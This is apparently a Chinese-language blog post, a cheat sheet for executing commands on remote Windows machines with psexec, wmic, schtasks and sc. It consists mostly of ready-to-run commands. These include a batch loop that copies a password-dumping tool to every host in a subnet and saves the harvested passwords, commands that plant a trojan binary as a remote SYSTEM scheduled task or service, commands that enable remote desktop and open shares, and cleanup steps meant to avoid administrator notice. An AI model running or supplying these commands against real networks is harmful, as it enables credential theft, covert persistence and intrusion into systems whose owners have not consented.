---
title: 远程执行命令的几种方法 
tags:
- schtasks
- wmic
- psexec
- sc
- ipc
toc: flase
date: 2017-02-13 22:31:06
description:
categories: 内网安全
---
**查看远程计算机共享内容**
```bat
net view \\192.168.1.100
```
**psexec:
远程执行工具**

环境: 需要开启admin$
445端口

注意:psExec建立连接后会在对方机器安装一个服务(PSEXESVC),exit退出后会清除,但是会出现概率不能删除,易于管理员发现(本地测试过几次,只有一次安装了服务)
```bat
psexec \\192.168.1.100 /accepteula -u administrator -p 123456 ipconfig  #远程执行cmd命令并返回结果
psexec \\192.168.1.100 /accepteula -u administrator -p 123456 -c getpass.exe
```
-c <[路径]文件名>:拷贝文件到远程机器并运行(注意:运行结束后文件会自动删除)

getpass.exe为本机psexec.exe所在目录下,也可以直接执行其他目录的路径,例如c:\getpass.exe

**批量抓同网段密码**
```bat
for /L %%G in (128 1 128) do  psexec \\172.16.44.%%G  /accepteula -u administrator -p 123456 -c c:\getpass.exe >172.16.44.%%G_pass.txt
```
<!-- more -->
拷贝本地psexec.exe文件所在目录的getpass.exe到远程计算机. 执行并返回结果 ,并删除远程计算机的getpass.exe(批量抓全部机器密码)

**wmic:
从命令行接口和批命令脚本执行系统管理的支持**

环境:WMIC服务启动(Windows Management Instrumentation),禁用情况下会提示Description = 无法启动服务
135端口

```bat
wmic /node:192.168.1.100 /user:administrator /password:123456 process call  create c:\1.exe      ##创建进程,可以直接运行exe程序或者执行系统命令,例如添加用户,不过没有命令返回的结果  
wmic /node:192.168.1.100 /user:administrator /password:123456 process  ##查看远程计算机进程   
wmic /node:192.168.1.100 /user:administrator /password:123456 process where name="calc.exe" call terminate  ##关闭远程计算机进程   
wmic /output:"%userprofile%\Desktop\temp.html" /node:192.168.1.100 /user:administrator /password:123456  process list full /format:htable ##读取进程并以html格式化输出到本地桌面   
wmic /node:192.168.1.100 /user:administrator /password:123456 useraccount ##查看远程计算机用户    
wmic /node:192.168.1.100 /user:administrator /password:123456 computersystem get domain  ##读取远程计算机域/工作组    
wmic /node:192.168.1.100 /user:administrator /password:123456 SHARE CALL Create "","test","3","c_share","","c:\",0  ##开启远程计算机共享 c_share为共享名字,c:\为共享路径  
wmic /node:192.168.1.100 /user:administrator /password:123456 SHARE where name="c_share" call delete  ##删除远程计算机共享,可以直接运行SHARE  查看全部共享 
wmic /node:192.168.1.100 /user:administrator /password:123456  PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1         ##开启远程计算机的远程桌面 
wmic /output:"%userprofile%\Desktop\temp.html" /node:192.168.1.100 /user:administrator /password:123456 FSDIR where "drive='c:'" list  /format:htable    ##读取远程计算机C盘的全部目录并输出到桌面
```
**schtasks:
本地或远程系统上的计划系统。替代 at**

条件:启动Task Scheduler服务
```bat
net use \\192.168.1.100\ipc$ 123456 /user:administrator 
schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /s \\192.168.1.100 /ru system  /sc once /st 05:00 
schtasks /run /tn foobar /s  192.168.1.100              ##远程计算机启动任务 
schtasks /F /delete /tn foobar /s 192.168.1.100          ##清除schtasks
```
**sc:
远程创建服务管理程序**

sc命令各个参数的等号后面都要有一个空格,否则报语法错误
```bat
sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    ##新建服务,指向拷贝的木马路径 
sc \\192.168.1.100 create foobar binpath= c:\udp.exe obj= administrator password= "123456" 
sc \\192.168.1.100 start foobar        ##启动建立的服务 
sc \\192.168.1.100 delete foobar    ##完事后删除服务
```
